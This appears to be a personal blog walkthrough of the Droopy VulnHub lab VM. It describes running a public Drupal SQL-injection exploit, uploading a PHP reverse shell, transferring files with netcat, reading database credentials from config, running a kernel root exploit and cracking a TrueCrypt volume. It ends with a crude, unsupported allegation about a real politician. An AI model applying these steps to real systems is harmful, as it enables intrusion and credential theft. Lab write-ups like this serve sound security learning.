<p>Another walkthrough. This time for the Droopy-vm. It can be found here on <a href="https://www.vulnhub.com/entry/droopy-v02,143/">vulnhub.com</a></p>
<p>I tried out netdiscover, just to learn something new. I have seen that other people use it. It turns out that it works to find hosts on the network. It works by sending out ARP-requests throughout the network and loggin the requests. I am not really sure if nmap is using a different technique. But it is good to know that there is an alternative to nmap for it.</p>
<p>[code lang="bash"]<br />
netdiscover -r 192.168.1.0/24<br />

<p>So I ran nmap.<br />

<p>First I thought that the MD5 was a flag or something. But then I read that that is the standard way for nmap to output if it doesn't know the service.</p>
<p>The robots file is just filled with stuff.</p>
<p>Among the many files was this.<br />
http://droopy.dev/CHANGELOG.txt<br />
 Drupal 7.30, 2014-07-24 </p>
<p>This reminded me about a huge vulnerability that was in drupal a few years ago, that I had heard about.</p>
<p>I continued the scanning by running nikto and then checking out the info.php file to see what I could find.</p>
<p>This is some of all the info.<br />
[code]<br />
http://droopy.dev/info.php<br />

The default apache-page was also found.<br />
http://droopy.dev/index.html</p>
<p>I tried to brute-force the login. This made the server block my IP. And I also think I made it run out of memory or something. Because is subsequently crashed. Great. So I restarted the VM fresh again. And this time I checked out the drupal-exploit. </p>
<p>So I searched for exploits on the <a href="https://www.exploit-db.com/search/?order_by=date&amp;order=desc&amp;pg=1&amp;action=search&amp;description=Drupal">exploits-database.</a><br />
There I found four exploits that are called something along the lines of: Drupal Core &lt;= 7.32 - SQL Injection.<br />
Or similar. Two were written in python two in php. I just picked one, and downloaded it and ran it. Which was pretty stupid, because I created, by default in the exploit, a user with the username admin. So I overwrote the original user.<br />
So once I later gained access, and checked in the database. I only found my own user. Otherwise I would have been able to crack the hash of the original user and that password could have been good to know.</p>
<p>Anyhow, I gained access and after some googeling I figured out how to allow php in drupal (modules/php-filter). And I uploaded the php-reverse-shell.ph that I found here:<br />
usr/share/laudanum/php/php-reverse-shell.php</p>
<h2>Privilege escalation</h2>
<p>Now I had shell for user: www-data. So I went to /tmp and started netcat to transfer my enumeration-file.<br />
[code]<br />
nc -lvp 3333 &gt; enum.sh<br />
[/code]</p>
<p>Then I sent the file with:<br />
[code]<br />
nc 192.168.1.104 3333 &lt; enum.sh<br />
[/code]<br />
Then: chmod +x enum.sh</p>
<p>Among other things I found:<br />
[code lang="bash"]<br />
uid=1000(gsuser) gid=1000(gsuser) groups=1000(gsuser),24(cdrom),30(dip),46(plugdev),110(lpadmin<br />
hostname is:<br />
HOSTNAME=dhcppc5<br />
#In the hosts file I find this.<br />
127.0.1.1	droopy.knight139.co.uk	droopy<br />
[/code]</p>
<p>I remembered that every web-server that runs mysql has the logins for it in some file. So after some snooping-around I found the file:</p>
<p>[code]<br />
/var/www/html/sites/default</p>
<p>$databases = array (<br />
  'default' =&gt;<br />
  array (<br />
    'default' =&gt;<br />
    array (<br />
      'database' =&gt; 'drupal',<br />
      'username' =&gt; 'drupaluser',<br />
      'password' =&gt; 'nimda',<br />
      'host' =&gt; 'localhost',<br />
      'port' =&gt; '',<br />
      'driver' =&gt; 'mysql',<br />
      'prefix' =&gt; '',<br />
    ),<br />
  ),<br />
);<br />
[/code]</p>
<p>So I log in to mysql.</p>
<p>[code]<br />
mysql -u drupaluser -p drupal<br />
password: nimda</p>
<p>SHOW tables;</p>
<p>mysql&gt; SELECT * FROM users;<br />
SELECT * FROM users;</p>
<p>$S$DLx/ePXpg18r5tnZs8aHkngNTWpyjyMLvPvC0gdaEjo4agY8Iyym<br />
[/code]</p>
<p>So I went here: http://www.onlinehashcrack.com/hash-identification.php#res<br />
To identify what type of hash it was.</p>
<p>It turns out it is a SHA-512.<br />
- SHA-512(Drupal) </p>
<p>I study the commands of hashcat and found this:</p>
<p>[code]<br />
hashcat -m 7900 -a 0 -o found.txt admin.hash /usr/share/hashcat/rules/rockyou-30000.rule<br />
[/code]<br />
7900 is the drupal-mode.</p>
<p>Meanwhile I continue to look around and found an email in /var/spool/mail:</p>
<p>[code]<br />

<p>George,</p>
<p>   I've updated the encrypted file... You didn't leave any<br />
hints for me. The password isn't longer than 11 characters<br />
and anyway, we know what academy we went to, don't you...?</p>
<p>I'm sure you'll figure it out it won't rockyou too much!</p>
<p>If you are still struggling, remember that song by The Jam</p>
<p>Later,<br />
Dave<br />
[/code]</p>
<p>Okay, so it talks about an encrypted file. From a guy named Dave.</p>
<p>It looks like the encrypted file can be decrypted with a password that is found in the rockyou dictionary.<br />
We also know that the password is less than 11 characters, and it has something to do with an academy.<br />
And it is also the name of a song by the Jam. </p>
<p>So I started listening to some songs by The Jam a start looking for the encrypted file. But I couldn't really find anything useful.</p>
<p>After some minor cheating I learn that it is a good idea to look for privilege-escalation exploits. So I search exploit-database again and find several exploits. I download this one: https://www.exploit-db.com/exploits/37292/<br />
Transfered it over to the VM with nc. Then gcc, chmod and execute, and now I am root. BOOM! Fast when stuff just works.</p>
<p>In /root i found a file called dave.tc.<br />
After some googeling I found out that .tc probably is a true-crypt file. And after some more googeling I learned that there is a program called truecrack.<br />
After a lot of struggling I found that with sed we can remove all words in our dictionary that are shorter than 11 characters.</p>
<p>I did it with this command.<br />
The -i flag is important. It makes the changes in the current file. Without it nothing happens. As I learned.<br />
[code]<br />
sed -i -r '/^.{0,10}$/d' rr.txt<br />
[/code]<br />
So now we have a list with 1.8 millions.<br />
wc -l rr.txt<br />
1879453 rr.txt</p>
<p>Then I did<br />
grep acade rr.txt &gt; rr2.txt</p>
<p>To get all words containing the work academy. As it was mentioned in the email.</p>
<p>Then again:<br />
[code]<br />
truecrack -t dave.tc -k sha512 -b 8 -w rr2.txt -v </p>
<p>Found password:		&quot;etonacademy&quot;<br />
Password length:	&quot;12&quot;<br />
[/code]</p>
<p>On this page I learned how to mount a truecrypt-volume. So I did that.<br />
https://tails.boum.org/doc/encryption_and_privacy/truecrypt/index.en.html</p>
<p>[code]<br />
mkdir /media/dave</p>
<p>mount /dev/mapper/dave /media/dave<br />
ls /media/dave/<br />
buller  lost+found  panama<br />
[/code]</p>
<p>In the buller dir there is a file called bullingdon-crest.<br />
https://en.wikipedia.org/wiki/Bullingdon_Club</p>
<p>Now I get it. The Dave character is David Cameron. And I guess the shares.jpg refers to his corrupt family's holdings in off-shore banks. And the pig in .secret is of course the infamous pig he most likely fucked. And in the .top dir is the flag. Pretty clever ending to a great VM!</p>
<h2>Conclusion</h2>
<p>So on this VM I really learned a lot!<br />
The most important thing I think was: always check the exploit-database!<br />
All it really took was to search for two exploits to gain root. First to enter drupal-admin and then to elevate to root.</p>
<p>I really liked it because it felt very real. The drupal and priv-escalation exploits are both very real. Thanks to knightmare for a great VM!</p>
